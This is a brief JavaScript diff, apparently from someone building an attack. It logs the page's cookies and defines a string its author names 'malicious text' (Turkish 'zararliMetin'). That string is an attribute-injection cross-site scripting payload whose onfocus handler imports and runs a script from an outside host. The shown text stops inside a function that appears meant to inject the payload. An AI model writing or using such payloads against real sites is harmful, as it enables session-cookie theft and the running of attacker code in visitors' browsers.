@@ -1,5 +1,5 @@
 console.log('selam');
-console.log(document.cookie)
+console.log(document.cookie);
   
 (function() {
   const zararliMetin = `"autofocus onfocus="import('https://abbb.3d.tc/a.js');`;
